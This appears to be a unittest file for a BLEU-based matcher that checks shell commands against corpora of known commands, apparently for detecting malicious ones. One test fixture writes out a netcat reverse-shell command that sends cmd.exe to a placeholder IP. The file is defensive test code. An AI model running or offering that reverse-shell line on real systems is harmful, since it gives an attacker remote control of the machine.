"""Validate corpus constraints and the indexed BLEU implementation."""
from pathlib import Path
import re
import tempfile
import unittest
import warnings

from nltk.translate.bleu_score import sentence_bleu

from src.config import paths
from src.features.similarity import SimilarityMatcher


class CorpusTests(unittest.TestCase):
    def test_all_references_are_valid_and_match_themselves(self):
        for platform, lower, upper in (("windows", 150, 250), ("linux", 100, 200)):
            corpus = paths(platform)["corpus"]
            lines = corpus.read_text(encoding="utf-8").splitlines()
            self.assertTrue(lower <= len(lines) <= upper)
            self.assertEqual(len(lines), len(set(lines)))
            matcher = SimilarityMatcher(str(corpus), platform)
            self.assertEqual(len(matcher._corpus), len(lines))
            for index, line in enumerate(lines, 1):
                with self.subTest(platform=platform, line=index):
                    self.assertTrue(10 <= len(line) <= 95)
                    self.assertTrue(all(ord(char) >= 32 for char in line))
                    self.assertGreaterEqual(len(matcher._tokenizer(line)), 4)
                    self.assertTrue(matcher.is_similar(line))

    def test_digit_normalization_applies_to_both_sides(self):
        with tempfile.TemporaryDirectory() as directory:
            corpus = Path(directory) / "known.corpus"
            corpus.write_text("nc.exe 192.0.2.10 4444 -e cmd.exe\n", encoding="utf-8")
            matcher = SimilarityMatcher(str(corpus))
            self.assertTrue(matcher.is_similar("nc.exe 198.51.100.20 8888 -e cmd.exe"))

    def test_index_agrees_with_full_bleu_scan(self):
        for platform in ("windows", "linux"):
            corpus = paths(platform)["corpus"]
            matcher = SimilarityMatcher(str(corpus), platform)
            commands = corpus.read_text().splitlines()[::10]
            commands += ["echo harmless example text", "not-a-command --foo bar baz", "id"]
            for command in commands:
                tokens = matcher._tokenizer(re.sub(r"[0-9]+", "0", command))
                for threshold in (0.1, 0.5, 0.8, 1.0):
                    with self.subTest(platform=platform, command=command, threshold=threshold):
                        with warnings.catch_warnings():
                            warnings.simplefilter("ignore")
                            expected = (
                                6 <= len(command) <= 100 and len(tokens) >= 4
                                and any(sentence_bleu([ref], tokens) > threshold for ref in matcher._corpus)
                            )
                        self.assertEqual(matcher.is_similar(command, threshold), expected)

    def test_ineligible_references_are_not_indexed(self):
        with tempfile.TemporaryDirectory() as directory:
            corpus = Path(directory) / "known.corpus"
            corpus.write_text("whoami\none two three four\n", encoding="utf-8")
            matcher = SimilarityMatcher(str(corpus))
            self.assertEqual(len(matcher._corpus), 1)


if __name__ == "__main__":
    unittest.main()
